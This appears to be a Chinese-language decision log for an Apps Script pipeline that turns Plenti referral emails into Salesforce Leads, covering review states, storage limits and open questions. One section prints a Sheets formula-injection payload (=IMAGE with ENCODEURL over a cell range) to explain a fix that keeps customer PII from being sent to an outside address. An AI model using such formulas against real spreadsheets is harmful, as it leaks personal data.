## D-033 Q18:review = "脚本需要人帮忙" · SF Lead ID 超链接 · Sheets 公式注入防护 · Q18 关闭

Jack 2026-09-11 批准 Q18;同时定:**不加"当前状态"列**、**SF Lead ID 做成超链接,
写入时生成一次**、`followRedirects:false` 保持不变。

### ① review 的新语义

**review = 脚本需要人帮忙。** 不再表示"业务还没处理完"。

| 情形 | Q18 前 | Q18 后 | 依据 |
|---|---|---|---|
| 干净建出的 referral | review | **done** | Jack 批准的核心改动 |
| 同一封邮件重跑,marker 命中自己(`created===true`) | review | **done** | 与上一行是同一条 Lead |
| 降级:两个来源都没给出客户姓名 | review | review `[DEGRADED]` | 批准的例外 |
| 来源冲突:邮件与页面说法不一 | review | review `[SOURCES DISAGREE: …]` | 批准的例外 |
| 强制创建(临时,D-017) | review | review `[FORCED]` | 绕过了判定门 |
| **转介重发:token 命中别的邮件建的 Lead**(`created===false`) | review | **review `[RESENT …]`** | ⚠️ 见下 |
| 可信发件人但认不出 / supplement | review | review | 可能漏单 / 更新路径未实现 |
| 带链接的可疑发件人(转发 / 不在清单 / 认证失败) | review | review | 批准的例外"可疑发件人" |
| **不可信且无链接(out-of-scope)** | review(无标签) | **done**(无标签) | ⚠️ 见下 |
| error | error | error | 不变 |

**⚠️ 转介重发保留 review。** 我第一版按"去重已经做对了"把它落了 done,跑测试时
对照 D-026 发现不对:D-026 明确写着"只亮 Review 让人看是不是重复",那是 Jack 的
工作流决定,Q18 的批准范围里没有推翻它。已改回 review,并加了测试锁住。

**✅ out-of-scope 改成 done —— Jack 已确认(2026-09-11,见 D-034)。** 依据是 Q18 的原文"review **只留给**
降级、来源冲突、可疑发件人、错误",而 D-027 已把无链接的定义为"普通邮箱流量",
不属于其中任何一类。但这和 Phase 2 那条硬要求的**字面**有出入:"空发件人必须 review"。
那条要求的本意是"绝不判 internal、绝不静默丢弃",这两点都守住了(状态照常落盘、
Messages 表一整行带完整 reason),变的只是状态名。如果 Jack 认为字面也要守,
改回来是 `plProcess_` 里的一行。

**刻意没列进例外:** 审计留底缺失(`auditMissing`,页面没抓到但数据来自邮件)。
不在批准的清单里,也没有人能做的补救动作。它照旧写进 Description 与 Messages 表。
✅ Jack 已确认不列为例外(D-034)。

`plRefreshReview_` 与指纹逻辑不变,只是现在只对例外生效 —— 干净的 done 一次 SOQL
都不花。"待补联系方式"交给 Salesforce List View。

### ② Messages 表的三处连带改动(都在 `ivMessageLogRow_`)

1. **备注列对所有状态都写 reason**(原先只写 error / review)。不改的话 out-of-scope
   变成 done 之后,它的原因(发件人不在清单、推广邮件……)就从表里消失了。
2. **"Final state" 列:建出 Lead 但落了 review 的显示 `created + review`。** 原来只写
   `created`,Q18 前每条都是 review 所以没区别;Q18 之后不区分就会把例外藏起来。
   这是改已有列的取值,**没有新增列**。
3. **SF Lead ID 列写成 `=HYPERLINK(url, id)`**,只在写入时生成,不回头改历史行。
   本轮没调用过 Salesforce(没有 token)、Id 形状不对、或 instance_url 不是干净的
   https 地址时,退回纯文本 Id。

### ③ 🔴 顺带发现的安全问题:Sheets 公式注入(已修)

**写超链接时发现的。** 超链接能生效,靠的是 `setValues` 把以 `=` 开头的字符串
**当作用户输入、解析成公式** —— 而同一行里主题、正文、发件人都是**外部发件人可控**的,
任何人都能往组里投信。

一封主题为 `=IMAGE("https://…?"&ENCODEURL(L2:L50))` 的邮件,会在有人打开表格时,
由 Google 的服务器把其他行的正文(**含客户 PII**)发到外部地址。`+` `-` `@` 开头同理。
R7 引入 Messages 页时就存在,触发器还没开,所以没有真实暴露。

**修法:** 除超链接那一格外,每一格以 `= + - @` 开头的都前置一个单引号,强制按文本
存(单引号在 Sheets 里不显示)。顺带让 `+61…` 电话号码不再被转成数字。
超链接那一格自己把关(Id 形状 + URL 校验),测试断言**整行只有它一个公式**。

**⚠️ 离线测试只能证明单引号加上了,证明不了真实 Sheets 认它。** 我比较有把握它有效
(这是 `setValues` 防公式解析的常规做法),但没在真实表格里验证过。
已加进 SANDBOX_SETUP §9 验证第 4 步,**开触发器前请做一次。**

汇总页(`ivLogRun_`)没改:错误摘要每条以消息 ID 开头,其他列是数字和时间,
不存在外部可控的开头字符。

---

## D-034 Q18 两点确认;error 冻结的倒计时会随时间变短;Q19:写满时的表现与准备

### ① Jack 的确认(2026-09-11)

- **out-of-scope 落 done:同意。** Phase 2 "空发件人必须 review"的本意是"绝不判
  internal、绝不静默丢弃",两点都守住了;按新语义,噪音亮 Review 反而会淹掉真正
  要看的东西 —— 正是 Q18 要解决的问题。
- **页面没抓到、数据来自邮件:不列为例外,同意。** 人看到了也只能手动打开链接
  重抓,那是程序该做的事,不是人的活。**这一条等 D-028 的自动重试做完就彻底解决。**
- **转介重发保持 review:对。** D-026 的语义没有被 Q18 推翻。
- **最小状态 75 字节:够了。** 字段名保持一致、所有读者不用改,这个一致性比
  25 字节值钱。不再追 50 字节。
- **容量:正常运行 35 KB 可以接受;"error 没人处理会写满"必须写进运维文档的
  显眼位置** —— 已写进 README 顶部「运维须知」。

### ② 纠正:D-032 的"约 26 个工作日"只在上线初期成立

冻结期间的增长主要来自 out-of-scope(清理停在旧 `lower`,约 17 KB/工作日),再加上
建出 Lead 的状态和 internal / ignore 等,合计约 **20 KB/工作日**。倒计时是:

```
冻结后还剩几个工作日 ≈ (500 KB − 冻结时的用量) ÷ 约 20 KB
```

**冻结时的用量不是固定的 35 KB** —— 永久保存的状态(Q19)会一直涨。按每天 5 条
referral 估:上线时约 24 天;半年后用量约 320 KB,**只剩约 9 天**。
D-032 那个数字没错,但只描述了第一天。

### ③ Q19:永久状态写满时会发生什么

**上次说"约一年"算漏了。** 每条建出的 Lead 占两个永久键:

| 键 | 字节(含键名) |
|---|---|
| `IV2_MSG_<id>`(created 状态,含 reason / browserView / supplied 等) | 约 368 |
| `IV2_CREATE_<id>`(创建锁,我上次漏算了) | 约 104 |
| **合计** | **约 472** |

扣掉滚动的 35 KB,可用约 465 KB:

| referral / 工作日 | 写满所需工作日 |
|---|---|
| 3 | 约 328(约 15 个月) |
| 5 | **约 197(约 9 个月)** |
| 10 | 约 99(约 5 个月) |

⚠️ "每天 5 条"只来自入组首日 2 小时的样本(D-031),internal / ignore 状态(每条约
173 字节)的量**完全没有数据**。所以这个日期只能当量级看。

**终态和 L-04 一样是整条管道停摆,但进入方式不同,而且更安静。** 按代码逐步走:

1. **第一次写失败,整轮直接抛出。** `plProcess_` 的 catch 会去写 error 状态,而
   **那次写也失败**,异常冲出主循环(主循环没包 try)。本轮剩下的邮件都不处理。
2. **本轮的留底全部丢失。** `ivLogRun_` 和 `ivLogMessages_` 在循环之后,执行不到:
   汇总页没有这一行;**本轮在失败点之前已处理的邮件,Messages 行永久缺失** ——
   它们的状态已落盘,以后不会再被处理,也就不会再补写。
3. **watermark 冻结 → 清理停止前进 → 不再腾出空间。** 下一轮在第一次写入就失败。
   **没有渐进阶段**:第一次失败基本就是停摆的开始。
4. **信号几乎全部静默。** error 状态写不进去,所以 `errorsPending`、汇总页的
   Failures 列都**不会亮** —— 我们为 L-01 / L-04 设计的信号全部失效。
   唯一的迹象是:**汇总页不再出现新行**,以及 Apps Script 的执行失败记录与失败通知邮件。
5. **referral 不会丢,也不会重复,但会延迟。** "Lead creation in progress" 这次写
   在 POST 之前,写不进去就不会发 POST;这些邮件停在冻结的窗口里,腾出空间后
   会被处理。**但 PLT001 的时钟按邮件时间走,停摆超过 1 个工作日,期间每一条都违约。**
   边界情况:空间恰好在 POST 前后用尽时,创建锁可能停在 `requested`;带 token 的
   referral 下次重试会先按 token 找到那条 Lead,不会重复建。

另有一处我**不确定**:空间满时,覆盖一个已存在的键(例如 `IV2_REVIEW_CURSOR`,
值长度几乎不变)会不会也被拒绝。如果会,`ivRefreshOutstanding_` 末尾那次写(不在
try 里)会在清理运行**之前**就让整轮抛出。离线测试测不到这一层。

### ④ 那个时间点之前该准备什么(按先后)

**不要等到那个日期** —— 日期本身不准。准备工作按用量触发,不按日历:

1. **先有用量读数(建议尽早做,改动很小)。** 每轮在 console 汇总和汇总页记下
   Script Properties 总字节数,超过 60%(300 KB)时在错误摘要列里喊出来。
   有了它,Q19 和 ② 的倒计时都从"估算"变成"看表"。
2. **开触发器时把失败通知设为「立即通知」**(触发器设置里的 Failure notification)。
   写满的唯一早期信号是执行失败,默认的每日汇总太慢。已写进运维须知。
3. **用量到 60% 之前,从下面选:**
   - (a) **把清理扩到 internal / ignore / notice 的 done 状态** —— 安全推理与
     out-of-scope 完全相同(D-032),改动最小。
   - (b) **建出 Lead 的状态转 done 后压成最小形式** —— `supplied` 只在 review 期间
     给 `plRefreshReview_` 用;reason / browserView / attached / createdNow / at
     没有长期读者。每条从约 368 降到约 140 字节。
   - (c) **清理窗口外、已 done 的 Lead 的创建锁** —— 锁只防"POST 成功、状态没写上"
     那个窗口;状态已记下 record 且是 done,锁的任务就结束了。需要像 Q17 一样单独
     论证一遍再做。
   - (d) **清理窗口外的 Lead 状态本身** —— 收益最大(总量从此有界),但合并 referral
     会话上的 Created 标签靠它们,要先定标签语义(D-031 标签降级)。
   - (e) 外部状态存储(规格 §9)—— 改动大,前四项做完就没必要了。

   我的建议是 (a)+(b)+(c):都是 Q17 的同一个模式,做完每条 Lead 只剩约 140 字节,
   按 5 条/天约 **2.5 年**;若再做 (d),总量从此有界,不再有这个日期。
4. **真的写满了怎么办:** Script Properties 界面只能一个一个删,几百个键手工删不现实。
   所以**应急手段必须提前备好**(即上面的清理代码),而不是当场写。停摆期间 referral
   要回到人工:直接从 Plenti 邮件或 Portal 处理,守住 PLT001。

---

## Phase 2 审计记录(2026-09-08)

Jack 要求在改存储结构之前,基于实际代码回答三个问题。结论摘要如下,
完整分析见对话记录。

### 1. SF 写入失败时邮件会不会被标记为"已处理"?

**不会。** 失败落 `state:'error'`,而 `error` 在三处都被显式当作待重试:
`plProcess_`(`prior.state!=='error'` 才短路)、`runIntakeV2` 扫描循环、
以及 watermark 前移条件(任何一条 error 都会冻结 watermark)。
`leadCandidate:true` 保证邮件挂上 `SF-Lead-Review` 标签,可见不丢失。

**但重试会永久失败,直到人工介入** —— 见下方已知限制 L-01。

### 2. 打标记与 SF 写入的顺序 / 崩溃窗口

**顺序正确(write-ahead)**:中间态 `error` 先落盘 → 防重锁 `requested` 先落盘
→ POST → 锁推进 `created` → 回读 → 终态落盘。**任何时刻崩溃都不会留下"成功"
状态而 Salesforce 里没记录。**

- **Properties 窗口**:POST 返回到终态落盘之间,实质只有一次 SOQL 回读往返,
  量级几百毫秒。窗口内崩溃 → 下次靠 Description 的 `[Intake: …]` 标记恢复,
  不重复创建。**这是 D-013 必须保留 marker 的原因。**
- **Gmail 标签窗口**:`plProcess_` 完全不打标签,标签由 `ivSyncLabels_` 在整个
  thread 处理完之后统一打。窗口更大(秒级),但后果最轻且**自愈** ——
  下次扫描无条件重打标签,符合 §7 验收"写入成功但打标签失败 → 只补标签"。
- **最外层硬窗口**:Apps Script 6 分钟执行上限。`runIntakeV2` 自留 220 秒预算。
  硬杀时 `finally` 不保证执行,但 Apps Script 在执行结束时会自动释放 script
  lock。⚠️ **最后这一句有把握但非百分百确定,Phase 4 沙箱实测确认。**

### 3. 触发器重叠保护

**有** —— `LockService.getScriptLock()` + `tryLock(1000)`,`finally` 释放。
在两道安全开关检查之后获取,顺序正确;`ivRefreshOutstanding_` 在锁内执行。
拿不到锁就跳过本次(不排队、不报错),配合 10–15 分钟触发间隔合理。

**边界**:只保护同一项目。跨项目(info ↔ eDocs)无法原子去重(规格 §5.5);
锁保护的是扫描,不是 Salesforce 记录的 exactly-once。

---

## 已知限制(代码层面,区别于规格 §9 的设计层面限制)

### L-01 `IV2_CREATE_` 防重锁不回滚,任何写入失败都需人工介入

**发现于** 2026-09-08 审计 · **本轮不改**(Jack 决定)

`plCreateLead_` 在 POST **之前**把 `IV2_CREATE_<msgId>` 写成 `requested`,
POST 抛错时**不回滚**。下次重试直接抛
`Earlier create outcome is uncertain; check Salesforce before retrying creation`,
必须有人去 Script Properties 删掉那个键才能继续。

这是 §7 验收表"API 超时结果不确定 → 不盲目重建"要的行为,设计如此。
**代价是这把锁不区分"确定失败"和"结果未知"** —— 一个明摆着可重试的 HTTP 500
或网络抖动,和一次真正的超时,后果完全一样。

叠加 watermark 冻结(任何 error 都阻止前移),后果是**渐进劣化**而非立刻停摆:
新邮件仍在窗口内会被处理,已处理的会被便宜跳过,但 `lower` 不前移导致每次扫描
要列举的线程越来越多,最终撞上 220 秒预算 → `done=false` → watermark 更不前移。
这就是 EXPORT_NOTES 说的"积压需监控"。

**可能的改法(未决,不在本轮)**:按 HTTP 状态码区分 —— 4xx 且非 timeout 视为
"确定失败"可回滚锁;5xx / 超时 / 网络错误保持现状。需要 `ivReq_` 把状态码带出来。

### L-02 崩溃恢复后 `SF-Lead-Created` 标签不会亮

崩溃窗口恢复后 `state.created` 为 false,`ivLeadLabelFlags_.created` 因此为 false,
只亮 `SF-Lead-Review`。记录是对的,标签偏保守。影响很小,记录备查。

同一场景下 `IV2_CREATE_` 会永远停在 `requested` —— 无害,但是垃圾数据。

---

## 跨阶段待办(TODO)

### TODO-1 硬编码生产域名 → `INTERNAL_DOMAIN` 【✅ Phase 2 已完成】

**这是 D-001 的代价。已由 Phase 2 提交 `4654c1b` 处理。**

`src/Code.gs` 第 51 行(`ivClassify_` 内部邮件排除)硬编码了生产域名:

```javascript
if(!from||/@sunterra\.com\.au$/i.test(from))return {kind:'internal',top:top};
```

处理结果:该函数整体移入 `src/Legacy.gs`(原文保留),Plenti 路径改用
`src/Plenti.gs` 的 `plExclude_`,内部域名由 `ivInternalDomain_()` 读
Script Property `INTERNAL_DOMAIN`,**缺失即抛错停止**,符合规格 §3 禁止 #2。
离线测试 `testPlentiRequiredProperties` 覆盖缺失即抛错。

同类硬编码值的处置:

| 位置 | 硬编码值 | 处置 |
|---|---|---|
| `ivClassify_` L51 | `@sunterra.com.au` | ✅ 函数进 Legacy;主干改用 `INTERNAL_DOMAIN` |
| `ivAttachSource_` L129 | 文件标题 `'Info email '` | ✅ 改为 `'eDocs email '` |
| `ivCreateCandidate_` L115 | `Company:'Individual / Residential'` | ⏳ `plLeadPayload_` 按规格先写,注释标 **Q4** |
| `ivCreateCandidate_` L115 | `LeadSource:'Other'` | ✅ 主干写 `'Plenti'`,picklist 是否存在见 **Q3** |
| `ivReq_` L38 | API 版本 `v67.0` | 无需改,规格 §4 确认沿用 |

### TODO-2 规格文档内部引用路径与实际不符 【规格更新时一并修正】

规格与任务描述中引用的路径,与仓库实际路径不一致:

| 文档中写的 | 实际 |
|---|---|
| `docs/开发规格.md` | `docs/eDocs-Plenti-Intake-开发规格.md` |
| `docs/handoff/` | `docs/edocs-plenti-handoff/` |

**以实际路径为准,不改文件名。** 后续如果规格文档更新,把这些引用一并修正。

另:规格提到 handoff 包含 5 个文件(`Code.gs` / `Tests.gs` /
`test-offline.cjs` / `README_CN.md` / `PLENTI_ADAPTATION.md`),实际是 8 个,
多出 `EXPORT_NOTES.md`、`appsscript.example.json`、`script-properties.example.json`。
`appsscript.json` 的 oauthScopes 即来自 `appsscript.example.json`。

### TODO-3 `INTAKE_V2_START` 的两个 fail-open 缺口 【✅ Phase 2 已修复】

Phase 2 写离线测试时发现,`runIntakeV2` 里这两行的组合有两个缺口:

```javascript
var began=Date.now(),cut=new Date(p.getProperty('INTAKE_V2_START')),cursor=new Date(p.getProperty('INTAKE_V2_WATERMARK')||cut.toISOString());
if(isNaN(cut.getTime())||isNaN(cursor.getTime()))throw new Error('Missing valid intake start/watermark');
```

1. **属性未设置 → 回扫到 1970。** `getProperty` 返回 `null`,`new Date(null)`
   得到 1970-01-01 而**不是** `NaN`,所以 `isNaN` 检查不触发。README 里
   `INTAKE_V2_START` 写的是"不自动回扫历史邮件",但代码没有强制这一点。
2. **属性是非法字符串 → 报错信息误导。** `cut.toISOString()` 在同一行先抛
   `RangeError: Invalid time value`,那句写好的
   `Missing valid intake start/watermark` 根本到不了。

那道 `isNaN` 检查实际上**只在 watermark 非法时可达**。

**都是 handoff 模板的既有行为,不是 Phase 2 引入的。**

我最初的判断是"两道安全开关关闭时不会触发,所以不是当前风险,留到上线前"。
**Jack 否决了这个推理,要求当期就改**,理由成立且更强:

> 这个推理的前提是开关会一直关着,但 **Phase 4 就会打开它们做沙箱端到端测试,
> 而那时 `INTAKE_V2_START` 很可能还没配**。后果是脚本回扫 `sf-intake` 邮箱的
> 全部历史邮件 —— 沙箱里是浪费时间,如果哪次配置指向生产,就是一次无法撤销的
> 批量写入。而且这两个缺陷藏得很深:第一个完全静默,第二个让一句写好的防御
> 代码永远不可达,不会随时间更容易发现。

同时明确了这不超出批准范围:§5.7 的批复已经写了"属性缺失抛错",
`INTAKE_V2_START` 与 `EDOCS_GROUP_ADDRESS` 是同一类必填属性,只是模板对前者的
校验写坏了。

**修复内容**(`src/Code.gs` `runIntakeV2`,带 `[Phase 2]` 注释):

```javascript
var began=Date.now(),start=p.getProperty('INTAKE_V2_START');
if(!start)throw new Error('Configure INTAKE_V2_START');
var cut=new Date(start);
if(isNaN(cut.getTime()))throw new Error('Configure INTAKE_V2_START with a parsable ISO timestamp');
var cursor=new Date(p.getProperty('INTAKE_V2_WATERMARK')||cut.toISOString());
if(isNaN(cursor.getTime()))throw new Error('Missing valid intake start/watermark');
```

两项校验都在任何 `Date` 方法调用之前完成,`RangeError` 不再可能抢先抛出。
watermark 的校验保持原样。

**断言**:既然修了就必须锁住,否则以后重构 `runIntakeV2` 会把它改回去。
`test/offline.cjs` 加了三条 —— 缺失即抛错且信息可辨认、非法字符串抛的不是
`RangeError`、合法 start 配非法 watermark 仍走原有检查。已反向验证:把
`runIntakeV2` 改回模板原写法,套件确实变红。

(我先前写的"测试不该把待修的行为锁死成规范"在当时成立,行为修好之后就不再
适用 —— 现在锁住的是正确行为。)

---

## Script Properties 清单

所有环境相关值一律走 Script Properties,代码中不硬编码,**缺失即抛错停止**
(规格 §3 禁止事项 #2)。凭据不写进仓库,不发在聊天或邮件中。

### 已在模板中使用(Phase 1)

| 属性 | 用途 |
|---|---|
| `SF_LOGIN_URL` | 已核实的 Salesforce My Domain HTTPS 根地址;**先用沙箱** |
| `SF_CLIENT_ID` | 新建集成的凭据,**不复用 info 项目的** |
| `SF_CLIENT_SECRET` | 同上 |
| `INTAKE_MAILBOX` | eDocs 实际邮箱地址。**只用于来源说明文字,不切换邮箱** —— GmailApp 操作的是触发器实际执行用户的邮箱 |
| `INTAKE_ADMIN_ID` | 新 Lead 审核人的 Salesforce User ID,`005` 开头。见 README 的 Owner 未决风险 |
| `INTAKE_V2_START` | 明确时区的 ISO 上线时间,不自动回扫历史邮件 |
| `INTAKE_V2_ENABLED` | 默认 `false`,上线开关 |
| `EDOCS_ADAPTATION_VALIDATED` | 默认 `false`,验收后手动打开的安全锁 |

### Phase 2 新增(已实现,缺失即抛错停止)

| 属性 | 用途 |
|---|---|
| `INTERNAL_DOMAIN` | 内部邮件排除。取代模板里硬编码的生产域名(TODO-1 ✅)。填域名即可,带不带前导 `@` 都行 |
| `EDOCS_GROUP_ADDRESS` | 收信范围过滤(规格 §5.7)。检索串为 `list:<组地址> after:… before:… -in:spam -in:trash`。`list:` 匹配 Google Groups 写入的 `List-ID` 头 —— **操作符本身待 2026-09-09 样本验证**,`deliveredto:` 是备选 |
| `PLENTI_TRUSTED_SENDERS` | 可信 Plenti 发件地址 / 域(规格 §5.1)。格式见 D-009:逗号分隔,`user@domain` 或 `@domain`,子域名不自动可信。**具体填什么待样本确认** —— 拿到样本第一件事是打印全部邮件头,确认 Groups 是否保留了 `X-Original-Sender` 与 `X-Original-Authentication-Results` |
| `ATTACH_RAW_EMAIL` | 是否上传 `.eml` 原件到 Salesforce Files。**默认 `false`**,只有精确等于字符串 `'true'` 才开(规格 §5.6 / Q5)。这一项刻意**不抛错** —— 属性缺失即视为关闭,默认关闭才是安全方向 |

### R1 / R2 新增(2026-09-08)

| 属性 | 用途 | 缺失时 |
|---|---|---|
| `INTAKE_RECIPIENT_ALLOWLIST` | 收件人白名单(D-015)。格式同 `PLENTI_TRUSTED_SENDERS`:逗号分隔,`user@domain` 或 `@domain` | **抛错停止** |
| `INTAKE_LOG_SHEET_ID` | 运行日志 Google Sheet 的 ID(D-016 汇总页 / D-018 Messages 页)。⚠️ **该表含 PII,分享设置必须限制为指定人员**;ID 不入仓库 | **跳过,不报错** |
| `PLENTI_LEAD_SOURCE` | Lead 的 `LeadSource` 值(D-029)。**必须与 org 的活跃 picklist 值完全一致** —— 生产是 `Plenti Referrals`。建 Lead 前会校验,配错会在上锁前就停下 | **抛错停止** |
| `PLENTI_FORCE_CREATE` | 🔴 **临时**(D-017)。`'true'` 时绕过置信度判定直接建 Lead。**Phase 4 结束后连同代码一起删** | 视为 `false`,不报错 |
| `PLENTI_TEST_SENDER_OVERRIDE` | 🔴 **临时**(D-021)。**只有 R9 测试入口读它,主流程读不到**(两道锁)。设为一个邮箱地址后,该入口会伪造 §5.1 的两个身份头 —— **伪造的是整条可信验证链,不只是发件人**。进组后必须单独补测身份验证。**Phase 4 结束后连同代码一起删** | 视为未设置,不报错 |

### 运行时写入(不要手工设置,不要清空)

`INTAKE_V2_WATERMARK`、`IV2_MSG_*`、`IV2_CREATE_*`、`IV2_REF_*`、
`IV2_ACCOUNT_*`、`IV2_REVIEW_CURSOR`、`IV2_VERIFIED_ACCOUNT_*`

由脚本运行时写入,参与去重和失败恢复。**不复制 info 邮箱的实际值,也不要
随意清空。**

⚠️ **不要手工回拨或删除 `INTAKE_V2_WATERMARK`**(D-032)。窗口外的 out-of-scope
状态已被清理,回拨会让那些邮件被重新处理,Messages 表重复写行。不会重复建 Lead。
`IV2_MSG_*` 的数量现在会随时间**减少**,这是清理在工作,不是数据丢失。

---

## 开放问题(需 Jack / 业务侧决定,阻塞相应阶段)

| # | 问题 | 阻塞 | 规格出处 |
|---|---|---|---|
| Q1 | **Plenti 线索由谁跟进?** 目前全部指派给 `INTAKE_ADMIN_ID`,意味着 SLA 时钟开始跑但无人被分配联系客户 | **上线** | §5.9 |
| ~~Q2~~ | **已定** —— 字段名确认为 `Plenti_Received_At__c`(Jack,2026-09-08)。⏳ 状态:**待沙箱建字段验证**。⚠️ 规格 §5.3 要求的"先检查 org 中是否已有可复用字段"**照做,不能因为名字定了就跳过** | 待验证 | §5.3 |
| Q3 | `LeadSource` picklist 是否已有 `Plenti` 值?没有需先加(Setup 操作,不由脚本做) | Phase 4 | §5.9 |
| Q4 | `Company` 字段:模板写死 `Individual / Residential`,是否适用于 Plenti 转介 | Phase 3 | §5.9 |
| Q5 | 数据留存范围:是否允许保存整份融资申请 / 身份证明。在拍板前 `ATTACH_RAW_EMAIL` 保持 `false` | Phase 3 | §5.6 |
| ~~Q6~~ | ✅ **已关闭**(2026-09-09)—— delivery token 落地为 `Plenti_Lead_ID__c`,`plFindReferral_` 已实现为真实查询,见 D-019。原文:**已定** —— 存 Lead 自定义字段 `Plenti_Lead_ID__c`(Jack,2026-09-08),不用 Script Properties。因 D-013 任务 B 要 upsert,该字段**必须建成 External ID + Unique**。⏳ 状态:**待沙箱建字段验证**;字段长度待 2026-09-09 样本确认 ID 格式 | 待验证 | §5.4 / D-013 |
| Q7 | 模板"老客户在 Account 上建 Completed Task"分支是否保留(默认关闭) | Phase 2 | §5.10 |
| ~~Q17~~ | ✅ **已关闭**(2026-09-11)—— 三步都已实施,见 D-032。原提议里"窗口外的也不会再被扫到"按旧代码**不成立**(Gmail 按 thread 返回,旧邮件会随新邮件回到循环),第 1 步正是它成立的前提。原文:🔴 **Script Properties 约 6 个工作日写满(L-04),上线前必须修。** 建议组合拳:① 主循环只处理扫描窗口内的消息(不再遍历会话里的旧消息);② out-of-scope 状态只存最小形态(约 50 字节,而不是 454);③ 清理扫描窗口之外的 out-of-scope 状态 —— 它们不参与标签计算,也不会再被扫到。三条都要动 `runIntakeV2`(Code.gs)。另一条路是规格 §9 的外部状态存储,改动大得多 | 无 | §9 / D-031 / D-032 |
| ~~Q18~~ | ✅ **已关闭**(2026-09-11)—— 见 D-033。转介重发按 D-026 仍落 review;out-of-scope 改为 done、auditMissing 不列为例外,**Jack 已确认**(D-034)。原文:**review 的语义要不要改成"脚本需要人帮忙",而不是"业务还没处理完"?** 即:干净建出的 referral 直接落 `done`,`review` 只留给降级、来源冲突、可疑发件人、错误。这样同时解决 D-031 的三处影响:合并会话里的 Review 平时不亮,**一旦亮就说明真有事**(包括同标题的冒充邮件);轮询只针对少数例外;"待补联系方式"整体交给 Salesforce List View | 无 | D-024 / D-029 / D-031 / D-033 |
| Q19 | **永久状态的长期累积。** D-032 只清理 out-of-scope。仍会累积:① internal / ignore / notice 等 `done` 状态,每条约 173 字节,**量没有数据**;② 每条建出的 Lead 占约 472 字节(状态 368 + 创建锁 104 —— 最初估"约一年"时漏算了锁),按 5 条/天约 **9 个月**写满。写满的表现是**静默的停摆**,且会让 error 冻结的倒计时越来越短 —— 分析与准备清单见 **D-034**。建议先加用量读数,按用量(60%)而不是日期触发 (a)+(b)+(c) | 按用量触发,不阻塞上线 | §9 / D-032 / D-034 |
| ~~Q16~~ | ✅ **已关闭**(2026-09-09)—— 沙箱已建 Date/Time 字段并放开写入,值取自 `message.getDate()`,见 D-023。⚠️ **生产上仍未建**,探测保证不卡住,但建好之前生产无法从专用字段统计 PLT001。原文:**要不要建?** 我的建议是**建**。规格 §5.3 要求 PLT001 SLA 按该字段计算而非 `CreatedDate`,理由是轮询延迟会放大偏差;SLA 未达标 Plenti 可立即终止合同、无补救期。当前时间戳暂存在 `Plenti_Parsed_JSON__c` 里 —— 能满足审计,但**不可用于报表查询**,做不了 SLA 统计 | 上线前(建议尽快) | §5.3 / D-022 |
| Q15 | **跨邮箱去重(规格 §5.5)在 Plenti 路径上实际失效。** 它靠客户邮箱查询,而 Plenti 从不提供客户邮箱。info 与 eDocs 同时收到同一客户时不再能自动拦截。可能的替代:按姓名+地址模糊匹配(会误报),或接受这个缺口并靠人工审核兜住 | 上线前评估 | §5.5 / D-019 |
| Q14 | **PLT003(退出请求 2 个工作日内处理)怎么承载?** 规格 §1 列了这条 SLA,但"用 `Lead.Status` 的 `Withdrawn` 值记录退出请求"这个设计**从未在本项目做出过** —— 全仓库零记录,代码里 `plLeadPayload_` 写死的 Status 只有 `'New'`。汇报口径:**SLA 条款已识别,承载方式尚未设计**(Jack 2026-09-08 确认采用此口径,汇报中已删除 Withdrawn)。➡️ Jack 将在 2026-09-09 会上向 Plenti 索取退出请求的邮件样本与格式,拿到后再定承载方式 | 上线前 | §1 PLT003 |
| Q8 | Business Hours 修正(当前是 Los Angeles + 24/7,须改 Adelaide + 南澳公共假期)。本项目之外的 Salesforce 配置任务,但在修好前任何"工作日"计算都是错的 | SLA 计算 | §4 |
| ~~Q9~~ | ✅ **已关闭**(2026-09-10)—— 信号是 `Email`/`Phone`/`MobilePhone` 任一非空。Plenti 一条联系方式都不给(只在 Portal 里,双重验证无法自动化),所以非空**只可能是人填的**。见 D-024。原不再阻塞于 Q1。原文:**review 状态如何自动解除?** 不复用 `Lead_Category__c`(D-011)后 Phase 2 没有替代信号,`plRefreshReview_` 是空操作桩,`SF-Lead-Review` 标签需人工处理。真正的信号大概率是"Lead 被指派给跟进人" | **阻塞于 Q1**,不是待样本 | D-011 |
| ~~Q10~~ | **已关闭**(2026-09-10)—— 判据是邮件里有没有 Plenti browser-view 链接,与噪音量无关;并区分出同事转发。见 D-027 | 无 | §5.1 / D-027 |
| ~~Q11~~ | ~~`INTAKE_V2_START` 的两个 fail-open 缺口~~ **已关闭** —— Phase 2 当期修复,见 TODO-3 | 无 | —— |
| Q12 | **外部发件人能否直接投递到 eDocs 组?** moderation 那一层 Lily 已确认通了,但投递权限本身还没确认。若外部发件人被拦、或投递路径与预期不同,**Google Groups 写入的 `X-Original-Sender` / `X-Original-Authentication-Results` 可能根本不存在** —— 那样 `isPlentiSource_` 的全部前提要重想 | **Phase 3**(先于样本解析) | §5.1 |
| Q13 | **沙箱的 Run As 用户若用 `jack.liu`,权限最小集就没被验证过。** 管理员身份下测试必然通过,到生产换成受限集成用户时才会集中暴露。若沙箱这样做了,生产上线前必须补测 | 上线前 | SANDBOX_SETUP §2.5 |
